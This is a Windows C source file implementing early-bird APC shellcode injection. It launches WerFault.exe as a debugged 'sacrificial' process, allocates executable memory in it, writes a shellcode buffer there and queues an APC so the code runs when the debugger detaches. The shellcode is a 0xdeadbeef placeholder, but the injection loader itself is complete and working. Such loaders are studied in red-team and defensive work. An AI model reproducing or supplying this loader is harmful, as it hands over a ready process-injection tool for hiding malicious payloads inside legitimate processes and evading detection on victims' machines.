#include <stdio.h>
#include <Windows.h>


//-----------
// SHELLCODE
//-----------
unsigned char data[] = {
	0xde,0xad,0xbe,0xef
};

SIZE_T dataLen = sizeof(data);


//----------------------------
// CREATE SACRIFICIAL PROCESS
//----------------------------
BOOL CreateSacrificialProc(DWORD* dwProcessId, HANDLE* hProc, HANDLE* hThread) {
	
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFO);

	// Create a new target process with "DEBUG_PROCESS" creation flag.
	// Can also use the "CREATE_SUSPENDED" creation flag.
	if (!CreateProcessA(NULL, "WerFault.exe", NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi)) {
		printf("[!!] CreateProcessA failed with error: %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = pi.dwProcessId;
	*hProc = pi.hProcess;
	*hThread = pi.hThread;

	return TRUE;
}


//-----------
// MAIN FUNC
//-----------
int main() {
	DWORD dwProc;
	HANDLE hProcess;
	HANDLE hThread;
	PVOID pBufAddress;

	CreateSacrificialProc(&dwProc, &hProcess, &hThread);
	pBufAddress = VirtualAllocEx(hProcess, NULL, dataLen, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (pBufAddress == NULL) {
		printf("[!!] VirtualAllocEx failed with error: %d \n", GetLastError());
		return -1;
	}
	
	if (!WriteProcessMemory(hProcess, pBufAddress, data, dataLen, (SIZE_T*)NULL)) {
		printf("[!!] WriteProcessMemory failed with error: %d \n", GetLastError());
		return -1;
	}

	QueueUserAPC((PAPCFUNC)pBufAddress, hThread, NULL);

	// If using the DEBUG_PROCESS creation flag
	DebugActiveProcessStop(dwProc);

	// If using the CREATE_SUSPENDED creation flag
	// ResumeThread(hThread);

	return 0;

}
